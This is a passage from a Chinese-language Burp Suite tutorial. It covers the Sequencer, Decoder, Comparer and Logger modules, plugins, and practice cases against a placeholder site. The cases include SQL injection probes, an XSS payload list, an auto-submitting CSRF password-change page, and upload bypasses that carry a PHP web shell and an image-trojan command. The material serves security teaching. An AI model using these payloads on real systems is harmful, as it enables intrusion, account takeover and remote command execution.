  <text x="824" y="274" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">a</text>
  <text x="824" y="292" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">e</text>
  <text x="824" y="310" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">d</text>
  <path d="M250,260 L270,260" stroke="#fbbf24" stroke-width="2" marker-end="url(#arseq)" fill="none"/>
  <path d="M430,260 L450,260" stroke="#fbbf24" stroke-width="2" marker-end="url(#arseq)" fill="none"/>
  <path d="M610,260 L630,260" stroke="#fbbf24" stroke-width="2" marker-end="url(#arseq)" fill="none"/>
  <path d="M790,260 L810,260" stroke="#fbbf24" stroke-width="2" marker-end="url(#arseq)" fill="none"/>
  <rect x="90" y="420" width="900" height="110" rx="10" fill="#b91c1c" fill-opacity=".22" stroke="#b91c1c" stroke-width="1.8" filter="url(#shseq)"/>
  <text x="540.0" y="446" text-anchor="middle" fill="#fecaca" font-size="15" font-weight="bold" font-family="Microsoft YaHei,Arial">判定标准示例（非常差的 Token 可直接爆破）</text>
  <text x="104" y="472" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">示例：token=202406270001（时间戳+自增）→ 熵值极低，Entropy ≈ 2.1 bit/char，被评为 Very Poor → 攻击者可伪造任意会话</text>
  <text x="104" y="490" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">示例：token=uuid4() (122bit 随机) → Entropy ≈ 5.95 bit/char，Excellent → 不可预测</text>
</svg>


### Sequencer模块是什么？

Sequencer（序列分析）是一个分析随机性的工具，主要用于检查：
- Session ID是否足够随机
- Token是否可以被预测
- 密码是否足够安全

想象你要分析抽奖号码是否公平：
- 如果号码总是按规律出现，抽奖可能有问题
- 如果号码完全随机，抽奖可能是公平的

Sequencer做的事情类似，它分析Token的随机性：
- 如果Token太规律，可能被预测，存在安全隐患
- 如果Token足够随机，安全性较好

### Sequencer使用方法

**步骤1：获取包含Token的请求**

在Proxy HTTP history中找到包含Session ID或Token的请求

**步骤2：发送到Sequencer**

右键 → "Send to Sequencer"

**步骤3：配置分析位置**

在Sequencer中：
1. 选择"Select live capture"或"Manual selection"
2. 标记Token的位置

**步骤4：开始分析**

点击"Start live capture"，Sequencer开始收集Token样本。

收集足够样本后，点击"Stop"查看分析结果。

### 分析结果解读

Sequencer会显示分析结果：

| 指标 | 说明 | 安全标准 |
|------|------|----------|
| Entropy | 信息熵 | 越高越好，建议>128位 |
| Character distribution | 字符分布 | 应均匀分布 |
| Correlation | 相关性 | 应无明显相关性 |
| Periodicity | 周期性 | 应无周期性规律 |

**判断标准：**

- **Good**：绿色，随机性足够
- **Bad**：红色，随机性不足，存在安全隐患
- **Warning**：黄色，需要注意

---

## 1.16 Decoder模块详解

<svg viewBox="0 0 1080 620" width="100%" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:1080px;margin:18px auto;display:block;border:1px solid #2a2a3a;border-radius:14px;background:#0f1124;">
  <defs>
    <linearGradient id="gtdec" x1="0" x2="1"><stop offset="0%" stop-color="#f59e0b"/><stop offset="100%" stop-color="#ef4444"/></linearGradient>
    <linearGradient id="gbdec" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#1e293b"/><stop offset="100%" stop-color="#0b1220"/></linearGradient>
    <marker id="ardec" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#fbbf24"/></marker>
    <filter id="shdec"><feDropShadow dx="0" dy="2" stdDeviation="2" flood-color="#000" flood-opacity=".5"/></filter>
  </defs>
  <rect x="0" y="0" width="100%" height="100%" fill="url(#gbdec)" rx="14"/>
  <text x="540" y="44" text-anchor="middle" fill="url(#gtdec)" font-size="22" font-weight="bold" font-family="Microsoft YaHei,Arial">Burp Decoder 常用编解码映射图（10 种转换）</text>
  <text x="540" y="72" text-anchor="middle" fill="#94a3b8" font-size="13" font-family="Microsoft YaHei,Arial">选中数据 → 右键 Send to Decoder → 选编码类型 或 Smart decode 自动识别</text>
  <rect x="440" y="110" width="200" height="80" rx="10" fill="#0ea5e9" fill-opacity=".22" stroke="#0ea5e9" stroke-width="1.8" filter="url(#shdec)"/>
  <text x="540.0" y="136" text-anchor="middle" fill="#fbbf24" font-size="15" font-weight="bold" font-family="Microsoft YaHei,Arial">原始字符串 / Raw Bytes</text>
  <text x="454" y="162" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">Base64 / Hex / URLencode</text>
  <text x="454" y="180" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">HTML Entity / Unicode</text>
  <text x="454" y="198" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">ASCII / GZIP / 哈希</text>
  <rect x="440" y="280" width="200" height="80" rx="10" fill="#8b5cf6" fill-opacity=".22" stroke="#8b5cf6" stroke-width="1.8" filter="url(#shdec)"/>
  <text x="540.0" y="306" text-anchor="middle" fill="#fbbf24" font-size="15" font-weight="bold" font-family="Microsoft YaHei,Arial">Base64 编/解码</text>
  <text x="454" y="332" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">YWRtaW4= ↔ admin</text>
  <text x="454" y="350" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">aGVsbG8= ↔ hello</text>
  <path d="M540,190 L540.0,280" stroke="#fbbf24" stroke-width="2" marker-end="url(#ardec)" fill="none"/>
  <rect x="40" y="400" width="220" height="90" rx="10" fill="#10b981" fill-opacity=".22" stroke="#10b981" stroke-width="1.8" filter="url(#shdec)"/>
  <text x="150.0" y="426" text-anchor="middle" fill="#fbbf24" font-size="15" font-weight="bold" font-family="Microsoft YaHei,Arial">URL 编码 (%xx)</text>
  <text x="54" y="452" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">%2F ↔ /  %3F ↔ ?</text>
  <text x="54" y="470" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">%E4%B8%AD ↔ 中</text>
  <path d="M540,190 L150.0,400" stroke="#fbbf24" stroke-width="2" marker-end="url(#ardec)" fill="none"/>
  <rect x="820" y="400" width="220" height="90" rx="10" fill="#f97316" fill-opacity=".22" stroke="#f97316" stroke-width="1.8" filter="url(#shdec)"/>
  <text x="930.0" y="426" text-anchor="middle" fill="#fbbf24" font-size="15" font-weight="bold" font-family="Microsoft YaHei,Arial">Hex / 16 进制</text>
  <text x="834" y="452" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">414243 ↔ ABC</text>
  <text x="834" y="470" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">6869 ↔ hi</text>
  <path d="M540,190 L930.0,400" stroke="#fbbf24" stroke-width="2" marker-end="url(#ardec)" fill="none"/>
  <rect x="430" y="520" width="220" height="90" rx="10" fill="#ec4899" fill-opacity=".22" stroke="#ec4899" stroke-width="1.8" filter="url(#shdec)"/>
  <text x="540.0" y="546" text-anchor="middle" fill="#fbbf24" font-size="15" font-weight="bold" font-family="Microsoft YaHei,Arial">HTML / Unicode</text>
  <text x="444" y="572" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">&amp;amp; ↔ &amp;  &amp;#39; ↔ '</text>
  <text x="444" y="590" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">\\u4e2d ↔ 中</text>
  <path d="M540,190 L540.0,520" stroke="#fbbf24" stroke-width="2" marker-end="url(#ardec)" fill="none"/>
</svg>


### Decoder模块是什么？

Decoder（解码器）是一个编码/解码工具，支持多种编码格式。

想象你收到一封加密的信件，需要翻译成能读懂的语言。Decoder就是这样的翻译工具。

### 支持的编码类型

| 编码类型 | 说明 |
|----------|------|
| URL | URL编码（%XX格式） |
| HTML | HTML编码（&amp;等） |
| Base64 | Base64编码 |
| Hex | 十六进制编码 |
| ASCII | ASCII编码 |
| Binary | 二进制编码 |
| Gzip | Gzip压缩 |
| MD5 | MD5哈希（不可逆） |
| SHA | SHA哈希（不可逆） |

### Decoder使用方法

**步骤1：输入数据**

在"Input"区域输入要编码/解码的数据

**步骤2：选择操作**

点击"As decode"（解码）或"As encode"（编码）

**步骤3：选择编码类型**

选择具体的编码类型，如URL、Base64等

**步骤4：查看结果**

"Output"区域显示处理结果

### 实战：解码Base64

假设你发现一段Base64编码：
```
YWRtaW46MTIzNDU2
```

**解码步骤：**

1. 在Decoder输入：`YWRtaW46MTIzNDU2`
2. 选择"As decode"
3. 选择"Base64"
4. Output显示：`admin:123456`

原来是用户名密码！

### 实战：编码URL参数

假设你要注入SQL语句：
```
' OR '1'='1
```

URL编码后，特殊字符需要转换：

1. 在Decoder输入：`' OR '1'='1`
2. 选择"As encode"
3. 选择"URL"
4. Output显示：`%27%20OR%20%271%27%3D%271`

---

## 1.17 Comparer模块详解

### Comparer模块是什么？

Comparer（比较器）是一个数据对比工具，用于找出两段数据的差异。

想象你有两封信，想知道它们有什么不同：
- 逐字对比
- 标出不同之处

Comparer就是这样，帮你对比两个HTTP请求或响应的差异。

### Comparer使用方法

**步骤1：选择要比较的数据**

在Proxy HTTP history或其他模块中，选择两个请求或响应

**步骤2：发送到Comparer**

右键第一个 → "Send to Comparer" (Comparer 1)
右键第二个 → "Send to Comparer" (Comparer 2)

**步骤3：选择比较方式**

Comparer提供两种比较方式：

| 方式 | 说明 |
|------|------|
| Word-by-word | 按词对比 |
| Byte-by-byte | 按字节对比 |

**步骤4：查看差异**

Comparer会用不同颜色标出差异：
- 红色：删除的内容
- 绿色：添加的内容
- 蓝色：修改的内容

### 实战：对比登录成功和失败的响应

假设你测试登录功能，有两个响应：
- 成功登录响应
- 失败登录响应

发送到Comparer对比，发现：
- 成功响应包含"Welcome"字样
- 失败响应包含"Error"字样

这样你就知道了如何判断登录成功与否，可以用于Intruder爆破时判断。

---

## 1.18 Logger模块详解

### Logger模块是什么？

Logger（日志记录）是一个详细的流量记录工具，记录所有HTTP通信的完整细节。

Proxy的HTTP history记录了基本的请求信息，但Logger记录更详细，包括：
- 所有请求和响应
- WebSocket通信
- 完整的时间戳
- 详细的Header和Body

### Logger使用方法

点击"Logger"标签，你会看到所有记录的流量。

**界面：**

| 列 | 说明 |
|------|------|
| Time | 时间戳 |
| Tool | 来源工具（Proxy、Scanner等） |
| Host | 目标主机 |
| Method | HTTP方法 |
| Path | 请求路径 |
| Status | 响应状态码 |
| ... | 更多信息 |

**过滤功能：**

点击"Filter"按钮，可以设置过滤条件，只显示特定类型的流量。

---

## 1.19 常用插件安装

### 什么是Burp Suite插件？

Burp Suite插件（Extension）可以扩展Burp Suite的功能，比如：
- 增加新的测试功能
- 自动化常见任务
- 集成其他工具

### BApp Store（官方插件商店）

Burp Suite有官方插件商店BApp Store：

1. 点击"Extender"标签
2. 点击"BApp Store"子标签
3. 你会看到很多插件

### 常用插件推荐

| 插件 | 功能 | 说明 |
|------|------|------|
| SQLiPy | SQL注入测试 | 自动检测SQL注入 |
| Retire.js | JavaScript漏洞检测 | 检测过期的JS库 |
| Autorize | 权限测试 | 自动测试越权漏洞 |
| Logger++ | 增强日志 | 更详细的日志记录 |
| CO2 | SQLMap集成 | 调用SQLMap进行注入测试 |
| Turbo Intruder | 快速爆破 | 高并发爆破工具 |
| JSLinkFinder | JS链接发现 | 发现JS中的隐藏链接 |

### 安装插件方法

**方式一：从BApp Store安装**

1. 点击"Extender" → "BApp Store"
2. 找到需要的插件
3. 点击"Install"
4. 安装后，插件会出现在"Installed"子标签中

**方式二：手动安装**

如果插件不在BApp Store中，可以手动安装：

1. 下载插件文件（.jar文件）
2. 点击"Extender" → "Add"
3. 选择下载的.jar文件
4. 插件加载成功

---

## 1.20 实战案例：SQL注入检测

<svg viewBox="0 0 1080 600" width="100%" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:1080px;margin:18px auto;display:block;border:1px solid #2a2a3a;border-radius:14px;background:#0f1124;">
  <defs>
    <linearGradient id="gtsqli" x1="0" x2="1"><stop offset="0%" stop-color="#f59e0b"/><stop offset="100%" stop-color="#ef4444"/></linearGradient>
    <linearGradient id="gbsqli" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#1e293b"/><stop offset="100%" stop-color="#0b1220"/></linearGradient>
    <marker id="arsqli" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#fbbf24"/></marker>
    <filter id="shsqli"><feDropShadow dx="0" dy="2" stdDeviation="2" flood-color="#000" flood-opacity=".5"/></filter>
  </defs>
  <rect x="0" y="0" width="100%" height="100%" fill="url(#gbsqli)" rx="14"/>
  <text x="540" y="44" text-anchor="middle" fill="url(#gtsqli)" font-size="22" font-weight="bold" font-family="Microsoft YaHei,Arial">Burp Suite 实战 SQL 注入 6 步检测法</text>
  <text x="540" y="72" text-anchor="middle" fill="#94a3b8" font-size="13" font-family="Microsoft YaHei,Arial">Proxy 拦截 → Intruder Fuzz → Repeater 验证 → Payload 精化 → Union/盲注/报错 → 拖库</text>
  <rect x="80" y="170" width="160" height="200" rx="10" fill="#0ea5e9" fill-opacity=".22" stroke="#0ea5e9" stroke-width="1.8" filter="url(#shsqli)"/>
  <text x="160.0" y="196" text-anchor="middle" fill="#fbbf24" font-size="15" font-weight="bold" font-family="Microsoft YaHei,Arial">① 抓包定位</text>
  <text x="94" y="222" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">拦截可疑动态 URL</text>
  <text x="94" y="240" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">?id=xxx / ?search=xxx</text>
  <text x="94" y="258" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">/user.php?id=1</text>
  <path d="M240,270 L260,270" stroke="#fbbf24" stroke-width="2" marker-end="url(#arsqli)" fill="none"/>
  <rect x="260" y="170" width="160" height="200" rx="10" fill="#8b5cf6" fill-opacity=".22" stroke="#8b5cf6" stroke-width="1.8" filter="url(#shsqli)"/>
  <text x="340.0" y="196" text-anchor="middle" fill="#fbbf24" font-size="15" font-weight="bold" font-family="Microsoft YaHei,Arial">② 初测注入点</text>
  <text x="274" y="222" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">id=1' → 报错 / 页面差异</text>
  <text x="274" y="240" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">id=1 and 1=1 → 正常</text>
  <text x="274" y="258" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">id=1 and 1=2 → 异常</text>
  <path d="M420,270 L440,270" stroke="#fbbf24" stroke-width="2" marker-end="url(#arsqli)" fill="none"/>
  <rect x="440" y="170" width="160" height="200" rx="10" fill="#10b981" fill-opacity=".22" stroke="#10b981" stroke-width="1.8" filter="url(#shsqli)"/>
  <text x="520.0" y="196" text-anchor="middle" fill="#fbbf24" font-size="15" font-weight="bold" font-family="Microsoft YaHei,Arial">③ 类型判定</text>
  <text x="454" y="222" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">字符型 / 数字型</text>
  <text x="454" y="240" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">联合查询 / 报错 / 盲注</text>
  <text x="454" y="258" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">堆叠 / 二次注入</text>
  <path d="M600,270 L620,270" stroke="#fbbf24" stroke-width="2" marker-end="url(#arsqli)" fill="none"/>
  <rect x="620" y="170" width="160" height="200" rx="10" fill="#f97316" fill-opacity=".22" stroke="#f97316" stroke-width="1.8" filter="url(#shsqli)"/>
  <text x="700.0" y="196" text-anchor="middle" fill="#fbbf24" font-size="15" font-weight="bold" font-family="Microsoft YaHei,Arial">④ 查库表列</text>
  <text x="634" y="222" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">order by N 定列数</text>
  <text x="634" y="240" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">union select schema_name</text>
  <text x="634" y="258" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">group_concat(table_name)</text>
  <path d="M780,270 L800,270" stroke="#fbbf24" stroke-width="2" marker-end="url(#arsqli)" fill="none"/>
  <rect x="800" y="170" width="160" height="200" rx="10" fill="#ec4899" fill-opacity=".22" stroke="#ec4899" stroke-width="1.8" filter="url(#shsqli)"/>
  <text x="880.0" y="196" text-anchor="middle" fill="#fbbf24" font-size="15" font-weight="bold" font-family="Microsoft YaHei,Arial">⑤ 脱数据</text>
  <text x="814" y="222" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">dump users 表</text>
  <text x="814" y="240" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">admin password_hash</text>
  <text x="814" y="258" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">password crack via john</text>
  <path d="M880,370 L240,420" stroke="#fbbf24" stroke-width="2" marker-end="url(#arsqli)" fill="none"/>
  <rect x="80" y="420" width="160" height="200" rx="10" fill="#b91c1c" fill-opacity=".22" stroke="#b91c1c" stroke-width="1.8" filter="url(#shsqli)"/>
  <text x="160.0" y="446" text-anchor="middle" fill="#fbbf24" font-size="15" font-weight="bold" font-family="Microsoft YaHei,Arial">⑥ 防御建议</text>
  <text x="94" y="472" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">PDO 预编译 / ORM</text>
  <text x="94" y="490" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">输入过滤 + 权限最小化</text>
  <text x="94" y="508" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">WAF + SQL 审计</text>
  <rect x="440" y="420" width="160" height="120" rx="10" fill="#0ea5e9" fill-opacity=".22" stroke="#0ea5e9" stroke-width="1.8" filter="url(#shsqli)"/>
  <text x="520.0" y="446" text-anchor="middle" fill="#fbbf24" font-size="15" font-weight="bold" font-family="Microsoft YaHei,Arial">快速识别 3 种经典特征</text>
  <text x="454" y="472" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">报错含：You have an error → MySQL</text>
  <text x="454" y="490" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">Microsoft JET Database  → Access</text>
  <text x="454" y="508" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">ORA-XXXX → Oracle / PL/SQL</text>
</svg>


### 目标场景

假设目标网站：`http://target.example.com/product?id=1`

这是一个商品详情页面，参数id决定显示哪个商品。

### 检测步骤

**步骤1：正常访问**

浏览器访问：`http://target.example.com/product?id=1`

Burp Suite抓取请求：
```http
GET /product?id=1 HTTP/1.1
Host: target.example.com
```

观察响应：正常显示商品信息

**步骤2：发送到Repeater测试**

右键请求 → "Send to Repeater"

**步骤3：尝试注入**

修改请求，尝试各种注入payload：

**测试1：单引号**
```http
GET /product?id=1' HTTP/1.1
```

观察响应：
- 如果报错，如"You have an error in your SQL syntax"，可能存在注入
- 如果正常，可能不存在注入或被过滤

**测试2：布尔测试**
```http
GET /product?id=1 AND 1=1 HTTP/1.1
GET /product?id=1 AND 1=2 HTTP/1.1
```

对比两个响应：
- 如果响应不同（第一个显示商品，第二个不显示），存在布尔盲注

**测试3：时间测试**
```http
GET /product?id=1; WAITFOR DELAY '0:0:5'-- HTTP/1.1
```

观察响应时间：
- 如果响应延迟5秒，存在时间盲注

**步骤4：使用Intruder自动化**

如果存在布尔盲注，可以使用Intruder自动化：

1. 发送请求到Intruder
2. 标记id位置：`id=§1§`
3. Payload设置数字范围：1-100
4. 观察每个响应的长度
5. 长度不同的可能是有数据的ID

**步骤5：使用SQLMap**

对于复杂的注入，可以使用SQLMap插件CO2：
1. 右键请求 → "Send to SQLMap"
2. SQLMap自动测试和提取数据

---

## 1.21 实战案例：XSS漏洞挖掘

### 什么是XSS？

XSS（Cross-Site Scripting，跨站脚本）是一种注入恶意JavaScript代码的漏洞。

想象你在论坛发帖，帖子内容会显示给其他用户。如果你在帖子中插入恶意代码，其他用户看帖子时，恶意代码就会执行。

### XSS类型

| 类型 | 说明 |
|------|------|
| 反射型XSS | 代码在URL中，服务器返回时执行 |
| 存储型XSS | 代码存储在服务器，每次访问都执行 |
| DOM型XSS | 代码在JavaScript中处理并执行 |

### 检测步骤

**目标场景**：搜索功能，搜索词会显示在结果页面

**步骤1：正常搜索**

浏览器访问：`http://target.example.com/search?q=test`

观察响应：页面显示"搜索结果：test"

**步骤2：抓取请求**

Burp Suite抓取请求：
```http
GET /search?q=test HTTP/1.1
Host: target.example.com
```

**步骤3：发送到Repeater**

右键 → "Send to Repeater"

**步骤4：测试XSS Payload**

修改请求，尝试XSS payload：

**测试1：简单脚本**
```http
GET /search?q=<script>alert(1)</script> HTTP/1.1
```

观察响应HTML：
- 如果响应中直接包含`<script>alert(1)</script>`，存在XSS
- 如果响应中script被过滤，不存在或被防护

**测试2：事件属性**
```http
GET /search?q=<img src=x onerror=alert(1)> HTTP/1.1
```

如果script被过滤，尝试其他方式。

**测试3：编码绕过**
```http
GET /search?q=<script>alert(1)</script> HTTP/1.1
```

但payload进行HTML编码：
```
&lt;script&gt;alert(1)&lt;/script&gt;
```

**步骤5：使用Intruder Fuzz**

使用Intruder批量测试各种XSS payload：

1. 发送请求到Intruder
2. 标记q参数：`q=§test§`
3. Payload type: Runtime file
4. 使用XSS payload字典
5. 观察哪些payload成功执行

### XSS Payload字典示例

```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<a href="javascript:alert(1)">click</a>
<div onmouseover="alert(1)">hover</div>
<input onfocus="alert(1)" autofocus>
<marquee onstart="alert(1)">
<details open ontoggle="alert(1)">
";alert(1)// 
'-alert(1)-'
</title><script>alert(1)</script>
</textarea><script>alert(1)</script>
...

```

---

## 1.22 实战案例：CSRF漏洞测试

### 什么是CSRF？

CSRF（Cross-Site Request Forgery，跨站请求伪造）是一种利用用户已登录状态进行恶意操作的漏洞。

想象你已经登录了银行网站，浏览器保存了你的登录凭证。这时，你访问了一个恶意网站，恶意网站悄悄向银行网站发送转账请求。银行网站收到请求，看到你有登录凭证，就执行了转账。

### CSRF检测步骤

**目标场景**：修改密码功能

**步骤1：抓取修改密码请求**

浏览器中修改密码，Burp Suite抓取请求：
```http
POST /change_password HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

old_password=oldpass&new_password=newpass&confirm_password=newpass
```

**步骤2：检查CSRF防护**

观察请求中是否包含：
- CSRF Token参数
- Referer Header检查
- 验证码

如果没有这些防护，可能存在CSRF漏洞。

**步骤3：测试CSRF**

创建一个测试HTML页面：
```html
<!DOCTYPE html>
<html>
<body>
<form action="http://target.example.com/change_password" method="POST">
  <input type="hidden" name="old_password" value="oldpass">
  <input type="hidden" name="new_password" value="hacked">
  <input type="hidden" name="confirm_password" value="hacked">
</form>
<script>
  document.forms[0].submit();
</script>
</body>
</html>
```

在另一个浏览器标签中打开这个页面（同时保持目标网站登录状态）

如果密码被修改，说明存在CSRF漏洞。

### Burp Suite CSRF测试方法

**使用Autorize插件：**

1. 安装Autorize插件
2. 配置你的登录Cookie
3. 抓取修改密码请求
4. 右键 → "Autorize"
5. Autorize会测试不带Token的请求是否成功

---

## 1.23 实战案例：文件上传绕过

### 目标场景

假设目标网站有文件上传功能，只允许上传图片文件。

### 检测步骤

**步骤1：抓取上传请求**

上传一个正常图片，抓取请求：
```http
POST /upload HTTP/1.1
Host: target.example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="test.jpg"
Content-Type: image/jpeg

[BINARY DATA]
------WebKitFormBoundary--
```

**步骤2：发送到Repeater**

右键 → "Send to Repeater"

**步骤3：尝试绕过**

**方法1：修改Content-Type**
```http
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
```

有些网站只检查Content-Type，不检查文件内容。

**方法2：双扩展名**
```http
Content-Disposition: form-data; name="file"; filename="test.php.jpg"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
```

有些网站解析双扩展名时，可能执行PHP。

**方法3：空字节截断**
```http
Content-Disposition: form-data; name="file"; filename="test.php%00.jpg"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
```

**方法4：图片马**
创建一个真正的图片文件，但包含PHP代码：
```bash
copy test.jpg/b + shell.php/a shell.jpg
```

上传shell.jpg，如果服务器解析漏洞，可能执行PHP。

---

## 1.24 实战案例：越权漏洞测试

<svg viewBox="0 0 1080 700" width="100%" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:1080px;margin:18px auto;display:block;border:1px solid #2a2a3a;border-radius:14px;background:#0f1124;">
  <defs>
    <linearGradient id="gtidor" x1="0" x2="1"><stop offset="0%" stop-color="#f59e0b"/><stop offset="100%" stop-color="#ef4444"/></linearGradient>
    <linearGradient id="gbidor" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#1e293b"/><stop offset="100%" stop-color="#0b1220"/></linearGradient>
    <marker id="aridor" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#fbbf24"/></marker>
    <filter id="shidor"><feDropShadow dx="0" dy="2" stdDeviation="2" flood-color="#000" flood-opacity=".5"/></filter>
  </defs>
  <rect x="0" y="0" width="100%" height="100%" fill="url(#gbidor)" rx="14"/>
  <text x="540" y="44" text-anchor="middle" fill="url(#gtidor)" font-size="22" font-weight="bold" font-family="Microsoft YaHei,Arial">IDOR 越权漏洞测试矩阵（Burp Repeater 实战）</text>
  <text x="540" y="72" text-anchor="middle" fill="#94a3b8" font-size="13" font-family="Microsoft YaHei,Arial">水平越权=同角色改他人数据；垂直越权=低权限操作高权限功能</text>
  <rect x="40" y="130" width="200" height="70" fill="#1e293b" stroke="#475569" stroke-width="1.2" rx="4"/>  <text x="140.0" y="170.0" text-anchor="middle" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">接口 / 角色</text>  <rect x="250" y="130" width="220" height="70" fill="#1e293b" stroke="#475569" stroke-width="1.2" rx="4"/>  <text x="360.0" y="170.0" text-anchor="middle" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">UserA（uid=1001）</text>  <rect x="480" y="130" width="200" height="70" fill="#1e293b" stroke="#475569" stroke-width="1.2" rx="4"/>  <text x="580.0" y="170.0" text-anchor="middle" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">UserB（uid=1002）</text>  <rect x="690" y="130" width="170" height="70" fill="#1e293b" stroke="#475569" stroke-width="1.2" rx="4"/>  <text x="775.0" y="170.0" text-anchor="middle" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">Guest 未登录</text>  <rect x="870" y="130" width="170" height="70" fill="#1e293b" stroke="#475569" stroke-width="1.2" rx="4"/>  <text x="955.0" y="170.0" text-anchor="middle" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">Admin 管理员</text>  <rect x="40" y="200" width="200" height="70" fill="#0f172a" stroke="#475569" stroke-width="1.2" rx="4"/>  <text x="140.0" y="240.0" text-anchor="middle" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">GET /api/user/1001/profile</text>  <rect x="250" y="200" width="220" height="70" fill="#0f172a" stroke="#475569" stroke-width="1.2" rx="4"/>  <text x="360.0" y="240.0" text-anchor="middle" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">✅ 200 OK（本人）</text>  <rect x="480" y="200" width="200" height="70" fill="#3f2404" stroke="#f59e0b" stroke-width="1.2" rx="4"/>  <text x="580.0" y="240.0" text-anchor="middle" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">⚠️ 200 OK？→ 水平越权</text>  <rect x="690" y="200" width="170" height="70" fill="#0f172a" stroke="#475569" stroke-width="1.2" rx="4"/>  <text x="775.0" y="240.0" text-anchor="middle" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">❌ 401/302</text>  <rect x="870" y="200" width="170" height="70" fill="#0f172a" stroke="#475569" stroke-width="1.2" rx="4"/>  <text x="955.0" y="240.0" text-anchor="middle" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">✅ 200 OK</text>  <rect x="40" y="270" width="200" height="70" fill="#111827" stroke="#475569" stroke-width="1.2" rx="4"/>  <text x="140.0" y="310.0" text-anchor="middle" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">PUT /api/user/1001/email</text>  <rect x="250" y="270" width="220" height="70" fill="#111827" stroke="#475569" stroke-width="1.2" rx="4"/>  <text x="360.0" y="310.0" text-anchor="middle" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">✅ 200 OK（本人改）</text>  <rect x="480" y="270" width="200" height="70" fill="#3f2404" stroke="#f59e0b" stroke-width="1.2" rx="4"/>  <text x="580.0" y="310.0" text-anchor="middle" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">⚠️ 200 OK？→ 水平越权写</text>  <rect x="690" y="270" width="170" height="70" fill="#111827" stroke="#475569" stroke-width="1.2" rx="4"/>  <text x="775.0" y="310.0" text-anchor="middle" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">❌ 401</text>  <rect x="870" y="270" width="170" height="70" fill="#111827" stroke="#475569" stroke-width="1.2" rx="4"/>  <text x="955.0" y="310.0" text-anchor="middle" fill="#e2e8f0" font-size="12.5" font-family="Microsoft YaHei,Arial">✅ 200 OK</text>  <rect x="40" y="340" width="200" height="70" 